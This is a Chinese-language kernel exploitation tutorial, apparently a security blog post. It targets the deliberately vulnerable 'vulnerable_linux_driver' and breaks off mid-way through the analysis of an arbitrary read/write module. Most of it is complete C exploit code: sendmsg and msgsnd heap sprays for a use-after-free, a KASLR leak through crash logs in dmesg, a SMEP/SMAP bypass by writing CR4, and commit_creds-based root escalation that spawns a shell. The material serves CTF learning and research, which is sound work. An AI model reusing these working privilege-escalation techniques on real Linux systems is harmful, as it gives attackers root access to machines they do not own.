> 原文链接: https://www.anquanke.com//post/id/204319 


# Kernel Pwn 学习之路 - 番外


                                阅读量   
                                **318756**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t012b90699683ce2270.jpg)](https://p4.ssl.qhimg.com/t012b90699683ce2270.jpg)



## 0x01 前言

由于关于Kernel安全的文章实在过于繁杂，本文有部分内容大篇幅或全文引用了参考文献，若出现此情况的，将在相关内容的开头予以说明，部分引用参考文献的将在文件结尾的参考链接中注明。

从本篇番外开始，将会记录在`CTF`中`Kernel Pwn`的一些思路，由于与`Kernel Pwn 学习之路(X)`系列的顺序学习路径有区别，故单独以番外的形式呈现。

本文将会以实例来说几个Linux提权思路，本文主要依托于以下两个文章分析：

[linux内核提权系列教程（1）：堆喷射函数sendmsg与msgsend利用](https://xz.aliyun.com/t/6286)

[linux内核提权系列教程（2）：任意地址读写到提权的4种方法 – bsauce](https://xz.aliyun.com/t/6296)



## 0x02 堆喷射执行任意代码(Heap Spray)

### <a class="reference-link" name="%E5%85%B3%E4%BA%8E%E5%A0%86%E5%96%B7%E5%B0%84"></a>关于堆喷射

`Heap Spray`是在`shellcode`的前面加上大量的`slide code`(滑板指令)，组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终将导致`shellcode`的执行。

传统`slide code`(滑板指令)一般是`NOP`指令，但是随着一些新的攻击技术的出现，逐渐开始使用更多的类`NOP`指令，譬如`0x0C`(`0x0C0C`代表的`x86`指令是`OR AL 0x0C`），`0x0D`等等，不管是`NOP`还是`0C`，它们的共同特点就是不会影响`shellcode`的执行。

### <a class="reference-link" name="Linux%20Kernel%E4%B8%AD%E7%9A%84Heap%20Spray"></a>Linux Kernel中的Heap Spray

首先，内核中的内存分配使用`slub`机制而不是`libc`机制，我们的利用核心就是在内核中寻找是否有**一些函数可以被我们直接调用，且在调用后会在内核空间申请指定大小的`chunk`，并把用户的数据拷贝过去**。

### <a class="reference-link" name="%E5%B8%B8%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0%20%E2%80%94%E2%80%94%20sendmsg"></a>常用的漏洞函数 —— sendmsg

#### <a class="reference-link" name="%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"></a>源码分析

`sendmsg`函数在`/v4.6-rc1/source/net/socket.c#L1872`中实现

```
static int ___sys_sendmsg(
    struct socket *sock, struct user_msghdr __user *msg,
    struct msghdr *msg_sys, 
    unsigned int flags,
    struct used_address *used_address,
    unsigned int allowed_msghdr_flags)
`{`
    struct compat_msghdr __user *msg_compat = (struct compat_msghdr __user *)msg;
    struct sockaddr_storage address;
    struct iovec iovstack[UIO_FASTIOV], *iov = iovstack;
    // 创建 44 字节的栈缓冲区 ctl ，此处的 20 是 ipv6_pktinfo 结构的大小
    unsigned char ctl[sizeof(struct cmsghdr) + 20]
        __attribute__ ((aligned(sizeof(__kernel_size_t))));
    // 使 ctl_buf 指向栈缓冲区 ctl
    unsigned char *ctl_buf = ctl;
    int ctl_len;
    ssize_t err;

    msg_sys-&gt;msg_name = &amp;address;

    if (MSG_CMSG_COMPAT &amp; flags)
        err = get_compat_msghdr(msg_sys, msg_compat, NULL, &amp;iov);
    else
        // 将用户数据的 msghdr 消息头部拷贝到 msg_sys
        err = copy_msghdr_from_user(msg_sys, msg, NULL, &amp;iov);
    if (err &lt; 0)
        return err;

    err = -ENOBUFS;

    if (msg_sys-&gt;msg_controllen &gt; INT_MAX)
        goto out_freeiov;
    flags |= (msg_sys-&gt;msg_flags &amp; allowed_msghdr_flags);
    //如果用户提供的 msg_controllen 大于 INT_MAX，就把 ctl_len 赋值为用户提供的 msg_controllen
    ctl_len = msg_sys-&gt;msg_controllen;
    if ((MSG_CMSG_COMPAT &amp; flags) &amp;&amp; ctl_len) `{`
        err = cmsghdr_from_user_compat_to_kern(msg_sys, sock-&gt;sk, ctl, sizeof(ctl));
        if (err)
            goto out_freeiov;
        ctl_buf = msg_sys-&gt;msg_control;
        ctl_len = msg_sys-&gt;msg_controllen;
    `}` else if (ctl_len) `{`
        // 注意此处要求用户数据的size必须大于 ctl 大小，即44字节
        if (ctl_len &gt; sizeof(ctl)) `{`
            // sock_kmalloc 会最终调用 kmalloc 分配 ctl_len 大小的堆块
            ctl_buf = sock_kmalloc(sock-&gt;sk, ctl_len, GFP_KERNEL);
            if (ctl_buf == NULL)
                goto out_freeiov;
        `}`
        err = -EFAULT;
        /*
         * Careful! Before this, msg_sys-&gt;msg_control contains a user pointer.
         * Afterwards, it will be a kernel pointer. Thus the compiler-assisted
         * checking falls down on this.
         * msg_sys-&gt;msg_control 是用户可控的用户缓冲区
         * ctl_len 是用户可控的长度
         * 这里将用户数据拷贝到 ctl_buf 内核空间。
         */
         */
        if (copy_from_user(ctl_buf, (void __user __force *)msg_sys-&gt;msg_control, ctl_len))
            goto out_freectl;
        msg_sys-&gt;msg_control = ctl_buf;
    `}`
    msg_sys-&gt;msg_flags = flags;

    ......

`}`
```

那么，也就是说，只要我们的用户数据大于`44`字节，我们就能够申请下来一个我们指定大小的Chunk，并向其填充数据，完成了堆喷的要件。

#### <a class="reference-link" name="POC"></a>POC

```
// 此处要求 BUFF_SIZE &gt; 44
char buff[BUFF_SIZE];
struct msghdr msg = `{`0`}`;
struct sockaddr_in addr = `{`0`}`;

int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
addr.sin_family = AF_INET;
addr.sin_port = htons(6666);

// 布置用户空间buff的内容
msg.msg_control = buff; // 此处的buff即为我们意图布置的数据
msg.msg_controllen = BUFF_SIZE; 
msg.msg_name = (caddr_t)&amp;addr;
msg.msg_namelen = sizeof(addr);

// 假设此时已经产生释放对象，但指针未清空
for(int i = 0; i &lt; 100000; i++) `{`
  sendmsg(sockfd, &amp;msg, 0);
`}`
// 触发UAF即可
```

### <a class="reference-link" name="%E5%B8%B8%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0%20%E2%80%94%E2%80%94%20msgsnd"></a>常用的漏洞函数 —— msgsnd

#### <a class="reference-link" name="%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"></a>源码分析

`msgsnd`函数在`/v4.6-rc1/source/ipc/msg.c#L722`中定义

```
// In /v4.6-rc1/source/ipc/msg.c#L722
SYSCALL_DEFINE4(msgsnd, int, msqid, struct msgbuf __user *, msgp, size_t, msgsz, int, msgflg)
`{`
    long mtype;

    if (get_user(mtype, &amp;msgp-&gt;mtype))
        return -EFAULT;
    return do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);
`}`

// In /v4.6-rc1/source/ipc/msg.c#L609

long do_msgsnd(int msqid, long mtype, void __user *mtext, size_t msgsz, int msgflg)
`{`
    struct msg_queue *msq;
    struct msg_msg *msg;
    int err;
    struct ipc_namespace *ns;

    ns = current-&gt;nsproxy-&gt;ipc_ns;

    if (msgsz &gt; ns-&gt;msg_ctlmax || (long) msgsz &lt; 0 || msqid &lt; 0)
        return -EINVAL;
    if (mtype &lt; 1)
        return -EINVAL;

    // 调用利用的核心函数 load_msg
    msg = load_msg(mtext, msgsz);
    ......
`}`

// In /v4.6-rc1/source/ipc/msgutil.c#L86

struct msg_msg *load_msg(const void __user *src, size_t len)
`{`
    struct msg_msg *msg;
    struct msg_msgseg *seg;
    int err = -EFAULT;
    size_t alen;

    // alloc_msg 会最终调用 kmalloc
    msg = alloc_msg(len);
    if (msg == NULL)
        return ERR_PTR(-ENOMEM);

    alen = min(len, DATALEN_MSG);
    // 第一次将我们用户的输入传入目标位置
    if (copy_from_user(msg + 1, src, alen))
        goto out_err;

    for (seg = msg-&gt;next; seg != NULL; seg = seg-&gt;next) `{`
        len -= alen;
        src = (char __user *)src + alen;
        alen = min(len, DATALEN_SEG);
        // 第二次将我们用户的输入传入目标位置
        if (copy_from_user(seg + 1, src, alen))
            goto out_err;
    `}`

    err = security_msg_msg_alloc(msg);
    if (err)
        goto out_err;

    return msg;

out_err:
    free_msg(msg);
    return ERR_PTR(err);
`}`

// In /v4.6-rc1/source/ipc/msgutil.c#L51

#define DATALEN_MSG    ((size_t)PAGE_SIZE-sizeof(struct msg_msg))
#define DATALEN_SEG    ((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))

static struct msg_msg *alloc_msg(size_t len)
`{`
    struct msg_msg *msg;
    struct msg_msgseg **pseg;
    size_t alen;

    alen = min(len, DATALEN_MSG);
    // 实际分配的大小将是 msg_msg 结构大小加上我们用户传入的大小
    msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL);
    ......
`}`
```

`do_msgsnd()`根据用户传递的`buffer`和`size`参数调用`load_msg(mtext, msgsz)`，`load_msg()`先调用`alloc_msg(msgsz)`创建一个`msg_msg`结构体，然后拷贝用户空间的`buffer`紧跟`msg_msg`结构体的后面，相当于给`buffer`添加了一个头部，因为`msg_msg`结构体大小等于`0x30`，因此用户态的`buffer`大小等于`xx-0x30`。也就是说**我们输入的前`0x30`字节不可控，也就是说我们的滑板代码中可能会被插入阻塞代码**。

#### <a class="reference-link" name="POC"></a>POC

```
struct `{`
    long mtype;
    char mtext[BUFF_SIZE];
`}`msg;

// 布置用户空间的内容
memset(msg.mtext, 0x42, BUFF_SIZE-1); 
msg.mtext[BUFF_SIZE] = 0;
int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
msg.mtype = 1; //必须 &gt; 0

// 假设此时已经产生释放对象，但指针未清空
for(int i = 0; i &lt; 120; i++)
    msgsnd(msqid, &amp;msg, sizeof(msg.mtext), 0);
// 触发UAF即可
```

### <a class="reference-link" name="%E4%BB%A5vulnerable_linux_driver%E4%B8%BA%E4%BE%8B"></a>以vulnerable_linux_driver为例

#### <a class="reference-link" name="%E5%85%B3%E4%BA%8Evulnerable_linux_driver"></a>关于vulnerable_linux_driver

`vulnerable_linux_driver`是一个易受攻击的Linux驱动程序，一般用于内核利用中的研究目的。

它是基于hacksys团队的出色工作完成的，该团队做了脆弱的[Windows驱动程序](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)。

这不是CTF风格的挑战，漏洞非常明显，主要目的是方便开发人员理解内核利用。

项目地址：[https://github.com/invictus-0x90/vulnerable_linux_driver](https://github.com/invictus-0x90/vulnerable_linux_driver)

#### <a class="reference-link" name="%E6%9E%84%E5%BB%BAvulnerable_linux_driver"></a>构建vulnerable_linux_driver

首先需要编译官方推荐使用的`4.6.0-rc1`版本内核，编译完成后，使用项目给出的`MAKEFILE`将其编译成为内核模块。

这里的文件系统可以使用如下`init`文件：

```
#!/bin/sh

mount -t devtmpfs none /dev
mount -t proc proc /proc
mount -t sysfs sysfs /sys

#
# module
#
insmod /lib/modules/*/*.ko
chmod 666 /dev/vulnerable_device

#
# shell
#
cat /etc/issue
export ENV=/etc/profile
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
umount /dev

poweroff -f
```

#### <a class="reference-link" name="%E6%A8%A1%E5%9D%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>模块漏洞分析

这里我们为了更贴近实战，使用`IDA`进行分析，并且为了演示堆喷射，这里仅分析其`Use-After-Free`漏洞。

首先是用于交互的`do_ioctl`函数我们首先通过带有`uaf`表示的变量来寻找相关的交互函数：
<li>
**申请并初始化一个Chunk，交互码`0xFE03`：**
<pre><code class="lang-c hljs cpp">if ( cmd != 0xFE03 )
    return 0LL;
// 分配一个UAF对象
v13 = (uaf_obj *)kmem_cache_alloc_trace(kmalloc_caches[1], 0x24000C0LL, 0x58LL);
if ( v13 )
`{`
    v13-&gt;arg = (__int64)v4;
    // fn 指向回调函数 uaf_callback
    v13-&gt;fn = (void (*)(__int64))uaf_callback;
    // 第一个缓冲区 uaf_first_buff 填充 "A"
    *(_QWORD *)v13-&gt;uaf_first_buff = 0x4141414141414141LL;
    *(_QWORD *)&amp;v13-&gt;uaf_first_buff[8] = 0x4141414141414141LL;
    *(_QWORD *)&amp;v13-&gt;uaf_first_buff[16] = 0x4141414141414141LL;
    *(_QWORD *)&amp;v13-&gt;uaf_first_buff[24] = 0x4141414141414141LL;
    *(_QWORD *)&amp;v13-&gt;uaf_first_buff[32] = 0x4141414141414141LL;
    *(_QWORD *)&amp;v13-&gt;uaf_first_buff[40] = 0x4141414141414141LL;
    *(_QWORD *)&amp;v13-&gt;uaf_first_buff[48] = 0x4141414141414141LL;
    // global_uaf_obj 全局变量指向该对象
    global_uaf_obj = v13;
    printk(&amp;unk_6A8); // 4[x] Allocated uaf object [x]
`}`
</code></pre>
</li>
<li>
**调用一个Chunk的fn指针，交互码`0xFE04`：**
<pre><code class="lang-c hljs cpp">if ( cmd == 0xFE04 )
`{`
    if ( !global_uaf_obj-&gt;fn )
        return 0LL;
    v14 = global_uaf_obj-&gt;arg;
    printk(&amp;unk_809); // 4[x] Calling 0x%p(%lu)[x]
    ((void (__fastcall *)(__int64))global_uaf_obj-&gt;fn)(global_uaf_obj-&gt;arg);
    result = 0LL;
`}`
</code></pre>
</li>
<li>
**创建一个`k_obj`，并向其传入数据，交互码`0x8008FE05`：**
<pre><code class="lang-c hljs cpp">if ( cmd == 0x8008FE05 )
  `{`
    v17 = kmem_cache_alloc_trace(kmalloc_caches[1], 0x24000C0LL, 0x60LL);
    if ( v17 )
    `{`
      copy_from_user(v17, v4, 0x60LL);
      printk(&amp;unk_825);
    `}`
    else
    `{`
      printk(&amp;unk_6C8);
    `}`
    return 0LL;
  `}`
</code></pre>
</li>
<li>
**释放一个Chunk，交互码`0xFE06`：**
<pre><code class="lang-c hljs cpp">case 0xFE06u:
    kfree(global_uaf_obj);
    printk(&amp;unk_843); // 4[x] uaf object freed [x]
    result = 0LL;
    break;
</code></pre>
</li>
这里的漏洞很明显，程序在释放那个`Chunk`时，并没有将其释放后的指针清零，这将造成`UAF`漏洞。

#### 利用`k_obj`控制执行流

那么，如果我们首先创建一个`Chunk`并释放，`global_uaf_obj`将指向一个已被释放的`0x58`大小的`Chunk`，接下来我们创建一个`k_obj`，由于大小相近，他们将处于同一个`cache`，而`k_obj`的内容是可控的，这将导致我们可以控制`global_uaf_obj -&gt; fn`利用代码如下：

```
//gcc ./exploit.c -o exploit -static -fno-stack-protector -masm=intel -lpthread
#include&lt;stdio.h&gt;
#include&lt;fcntl.h&gt;
#include&lt;string.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;unistd.h&gt;
#include&lt;pthread.h&gt;

void init()`{`
        setbuf(stdin,0);
        setbuf(stdout,0);
        setbuf(stderr,0);
`}`

size_t user_cs, user_rflags, user_ss, user_rsp;

void save_user_status()`{`
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("[+] Save User Status");
    printf("user_cs = %pn",user_cs);
    printf("user_ss = %pn",user_ss);
    printf("user_rsp = %pn",user_rsp);
    printf("user_rflags = %pn",user_rflags);
    puts("[+] Save Success");
`}`

int main(int argc,char * argv[])`{`
    init();
    save_user_status();

    int fd = open("/dev/vulnerable_device",0);
    if (fd &lt; 0)`{`
        puts("open fail!");
        return 0;
    `}`

    char send_data[0x60];
    memset(send_data,'A',0x60);

    ioctl(fd, 0xFE03, NULL);
    ioctl(fd, 0xFE06, NULL);

    ioctl(fd, 0x8008FE05, send_data);
    ioctl(fd, 0xFE04, NULL);
    return 0;
`}`
```

[![](https://img.lhyerror404.cn/error404/2020-04-26-031236.png)](https://img.lhyerror404.cn/error404/2020-04-26-031236.png)

那么，我们现在已经能控制`EIP`了。那么接下来我们考虑，如果没有`k_obj`以供我们利用，我们又应该如何控制执行流呢？

#### 利用`Heap Spray`控制执行流

这里我们采用两种方式进行`Heap Spray`，第一种是借助`sendmsg`函数。

⚠：使用`sendmsg`函数时，我们分配的目标`Chunk`应当大于`44`字节。

```
//gcc ./exploit.c -o exploit -static -fno-stack-protector -masm=intel -lpthread
#include&lt;stdio.h&gt;
#include&lt;fcntl.h&gt;
#include&lt;string.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;unistd.h&gt;
#include&lt;pthread.h&gt;
#include&lt;sys/types.h&gt;
#include&lt;sys/socket.h&gt;
#include&lt;netinet/in.h&gt;

#define BUFF_SIZE 0x60

void init()`{`
    ......
`}`

size_t user_cs, user_rflags, user_ss, user_rsp;

void save_user_status()`{`
    ......
`}`

void heap_spray_sendmsg(int fd, size_t target, size_t arg)
`{`
    char buff[BUFF_SIZE];
    struct msghdr msg=`{`0`}`;
    struct sockaddr_in addr=`{`0`}`;
    int sockfd = socket(AF_INET,SOCK_DGRAM,0);

    memset(buff, 0x43 ,sizeof buff);
    memcpy(buff+56, &amp;arg ,sizeof(long));
    memcpy(buff+56+(sizeof(long)), &amp;target ,sizeof(long));

    addr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);
    addr.sin_family=AF_INET;
    addr.sin_port=htons(6666);


    msg.msg_control=buff;
    msg.msg_controllen=BUFF_SIZE;
    msg.msg_name=(caddr_t)&amp;addr;
    msg.msg_namelen= sizeof(addr);

    ioctl(fd, 0xFE03, NULL);
    ioctl(fd, 0xFE06, NULL);

    for (int i=0;i&lt;10000;i++)`{`
        sendmsg(sockfd, &amp;msg, 0);
    `}`

    ioctl(fd, 0xFE04, NULL);
`}`

int main(int argc,char * argv[])`{`
    init();
    save_user_status();

    int fd = open("/dev/vulnerable_device",0);
    if (fd &lt; 0)`{`
        puts("open fail!");
        return 0;
    `}`

    heap_spray_sendmsg(fd,0x4242424242424242,0);
    return 0;
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-04-26-033543.png)

另一种方式就是调用`msgsnd`函数。

⚠：使用`msgsnd`函数时，我们分配的目标`Chunk`应当大于`44`字节。

```
//gcc ./exploit.c -o exploit -static -fno-stack-protector -masm=intel -lpthread
#include&lt;stdio.h&gt;
#include&lt;fcntl.h&gt;
#include&lt;string.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;unistd.h&gt;
#include&lt;pthread.h&gt;
#include&lt;sys/types.h&gt;
#include&lt;sys/ipc.h&gt;
#include&lt;sys/shm.h&gt;

#define BUFF_SIZE 0x60

void init()`{`
    ......
`}`

size_t user_cs, user_rflags, user_ss, user_rsp;

void save_user_status()`{`
    ......
`}`

int heap_spray_msgsnd(int fd, size_t target, size_t arg)`{`
    int new_len = BUFF_SIZE - 48;
    struct `{`
        size_t mtype;
        char mtext[new_len];
    `}` msg;

    memset(msg.mtext,0x42,new_len-1);
    memcpy(msg.mtext+56-48,&amp;arg,sizeof(long));
    memcpy(msg.mtext+56-48+(sizeof(long)),&amp;target,sizeof(long));
    msg.mtext[new_len]=0;
    msg.mtype=1; 

    int msqid=msgget(IPC_PRIVATE,0644 | IPC_CREAT);

    ioctl(fd, 0xFE03, NULL);
    ioctl(fd, 0xFE06, NULL);

    for (int i=0;i&lt;120;i++)`{`
        msgsnd(msqid,&amp;msg,sizeof(msg.mtext),0);
    `}`

    ioctl(fd, 0xFE04, NULL);
`}`

int main(int argc,char * argv[])`{`
    init();
    save_user_status();

    int fd = open("/dev/vulnerable_device",0);
    if (fd &lt; 0)`{`
        puts("open fail!");
        return 0;
    `}`

    heap_spray_msgsnd(fd,0x4343434343434343,0);
    return 0;
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-04-26-034530.png)

成功控制执行流之后就是如何提权的问题了，接下来我们修改`QEMU`的启动脚本，进一步加大利用难度

```
#!/bin/sh
qemu-system-x86_64 
-m 128M -smp 4,cores=1,threads=1  
-kernel bzImage 
-initrd  core.cpio 
-append "root=/dev/ram rw loglevel=10 console=ttyS0 oops=panic panic=1 quiet kaslr" 
-cpu qemu64,+smep,+smap 
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 
-nographic
```

**也就是开启了`KASLR`、`SMEP`、`SMAP`保护！**

#### 利用`Kernel Crash`泄露内核加载基址

可以发现，如果内核发生`crash`，会提示这样的信息`[&lt;ffffffffc011b47d&gt;] ? do_ioctl+0x34d/0x4c0 [vuln_driver]`，我们可以据此计算出内核加载基址。

**⚠：若使用此方法来绕过`kaslr`，我们必须保证触发`crash`时内核不会被重启，这要求我们的QEMU语句中不能存在`oops=panic panic=1`语句，这一句的意义是，将`oops`类型的错误视为`panic`错误进行处理，对于`panic`错误，经过1秒重启内核。**

```
// 构造 page_fault 泄露kernel地址。从dmesg读取后写到/tmp/infoleak，再读出来
pid_t pid=fork();
if (pid==0)`{`
    do_page_fault();
    exit(0);
`}`
int status;
wait(&amp;status);
//sleep(10);
printf("[+] Begin to leak address by dmesg![+]n");
size_t kernel_base = get_info_leak()-sys_ioctl_offset;
printf("[+] Kernel base addr : %p [+] n", kernel_base);

native_write_cr4_addr+=kernel_base;
prepare_kernel_cred_addr+=kernel_base;
commit_creds_addr+=kernel_base;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-04-26-121237.png)

#### 利用`native_write_cr4`绕过`SMEP`、`SMAP`

这个函数是一个内核级的函数，如果可以控制函数执行流以及第一个参数，我们就可以向`CR4`寄存器写入任意值。

函数在`/v4.6-rc1/source/arch/x86/include/asm/special_insns.h#L82`处实现：

```
static inline void native_write_cr4(unsigned long val)
`{`
    asm volatile("mov %0,%%cr4": : "r" (val), "m" (__force_order));
`}`
```

而我们此处的堆喷利用恰好满足条件，那么我们结合堆喷以及之前泄露内核加载基址的方式可以得到以下利用代码：

```
//gcc ./exploit.c -o exploit -static -fno-stack-protector -masm=intel -lpthread
#include &lt;sys/mman.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sched.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/ipc.h&gt;
#include &lt;sys/msg.h&gt;
#include &lt;sys/socket.h&gt;

#define sys_ioctl_offset 0x22FB79
#define BUFF_SIZE 0x60
#define GREP_INFOLEAK "dmesg | grep SyS_ioctl+0x79 | awk '`{`print $3`}`' | cut -d '&lt;' -f 2 | cut -d '&gt;' -f 1 &gt; /tmp/infoleak"

void init()`{`
    ......
`}`

size_t user_cs, user_rflags, user_ss, user_rsp;

size_t native_write_cr4_addr = 0x64500;
size_t prepare_kernel_cred_addr = 0xA40B0;
size_t commit_creds_addr = 0xA3CC0;

void save_user_status()`{`
    ......
`}`

int heap_spray_msgsnd(int fd, size_t target, size_t arg)`{`
    ......
`}`

void leak_kernel_base()`{`
    ......
`}`

int main(int argc,char * argv[])`{`
    init();
    save_user_status();
    leak_kernel_base();

    int fd = open("/dev/vulnerable_device",0);
    if (fd &lt; 0)`{`
        puts("open fail!");
        return 0;
    `}`

    heap_spray_msgsnd(fd,native_write_cr4_addr,0x6E0);
    // 验证结果↓
    heap_spray_msgsnd(fd,0x4545454545454545,0);
    printf("Done!");
    return 0;
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-04-26-123353.png)

#### <a class="reference-link" name="%E6%8F%90%E6%9D%83&amp;%E6%9C%80%E7%BB%88Exploit"></a>提权&amp;最终Exploit

于是我们最后可以使用`commit_creds(prepare_kernel_cred(0));`完成最终提权！

```
//gcc ./exploit.c -o exploit -static -fno-stack-protector -masm=intel -lpthread
#include &lt;sys/mman.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sched.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/ipc.h&gt;
#include &lt;sys/msg.h&gt;
#include &lt;sys/socket.h&gt;

#define sys_ioctl_offset 0x22FB79
#define BUFF_SIZE 0x60
#define GREP_INFOLEAK "dmesg | grep SyS_ioctl+0x79 | awk '`{`print $3`}`' | cut -d '&lt;' -f 2 | cut -d '&gt;' -f 1 &gt; /tmp/infoleak"

void init()`{`
        setbuf(stdin,0);
        setbuf(stdout,0);
        setbuf(stderr,0);
`}`

size_t user_cs, user_rflags, user_ss, user_rsp;

size_t native_write_cr4_addr = 0x64500;
char* (*prepare_kernel_cred_addr)(int) = 0xA40B0;
void (*commit_creds_addr)(char *) = 0xA3CC0;

void save_user_status()`{`
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("[+] Save User Status");
    printf("user_cs = %pn",user_cs);
    printf("user_ss = %pn",user_ss);
    printf("user_rsp = %pn",user_rsp);
    printf("user_rflags = %pn",user_rflags);
    puts("[+] Save Success");
`}`

int heap_spray_msgsnd(int fd, size_t target, size_t arg)`{`
    int new_len = BUFF_SIZE - 48;
    struct `{`
        size_t mtype;
        char mtext[new_len];
    `}` msg;

    memset(msg.mtext,0x42,new_len-1);
    memcpy(msg.mtext+56-48,&amp;arg,sizeof(long));
    memcpy(msg.mtext+56-48+(sizeof(long)),&amp;target,sizeof(long));
    msg.mtext[new_len]=0;
    msg.mtype=1; 

    int msqid=msgget(IPC_PRIVATE,0644 | IPC_CREAT);

    ioctl(fd, 0xFE03, NULL);
    ioctl(fd, 0xFE06, NULL);

    for (int i=0;i&lt;120;i++)`{`
        msgsnd(msqid,&amp;msg,sizeof(msg.mtext),0);
    `}`

    ioctl(fd, 0xFE04, NULL);
`}`

void leak_kernel_base()`{`
    pid_t pid=fork();
    if (pid==0)`{`
        int fd_child = open("/dev/vulnerable_device",0);
        if (fd_child &lt; 0)`{`
            puts("open fail!");
            return 0;
        `}`
        heap_spray_msgsnd(fd_child,0x4444444444444444,0);
        exit(0);
    `}`

    wait(NULL);

    printf("[+] Begin to leak address by dmesg![+]n");

    system(GREP_INFOLEAK);

    long addr = 0;
    FILE *fd = fopen("/tmp/infoleak", "r");

    fscanf(fd, "%lx", &amp;addr);
    fclose(fd);

    size_t kernel_base = addr - sys_ioctl_offset;
    printf("[+] Kernel base addr : %p [+] n", kernel_base);
    native_write_cr4_addr += kernel_base;
    prepare_kernel_cred_addr += kernel_base;
    commit_creds_addr += kernel_base;
`}`

void get_root()
`{`
    commit_creds_addr(prepare_kernel_cred_addr(0));
`}`

int main(int argc,char * argv[])`{`
    init();
    save_user_status();
    leak_kernel_base();

    int fd = open("/dev/vulnerable_device",0);
    if (fd &lt; 0)`{`
        puts("open fail!");
        return 0;
    `}`

    heap_spray_msgsnd(fd,native_write_cr4_addr,0x6E0);
    heap_spray_msgsnd(fd,(size_t)get_root,0);

    if(getuid() == 0) `{`
        printf("[!!!] Now! You are root! [!!!]n");
        system("/bin/sh");
    `}`
    return 0;
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-04-26-125416.png)



## 0x03 从任意地址读写提权

我们这里仍然以`vulnerable_linux_driver`为例，这里我们使用它的任意地址读写漏洞模块。

### <a class="reference-link" name="%E6%A8%A1%E5%9D%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>模块漏洞分析

与任意地址读写相关的交互函数如下：

**申请并初始化一个mem_buffer结构体将其存于全局变量g_mem_buffer，申请一个用户传入大小的chunk将其存于g_mem_buffer -&gt; data，交互码`0x8008FE07`：**

```
case 0x8008FE07:
if ( !copy_from_user(&amp;s_args, v3, 8LL) )
`{`
    if ( !s_args )
        return 0LL;
    if ( *(&amp;g_mem_buffer + 0x20000000) )
        return 0LL;
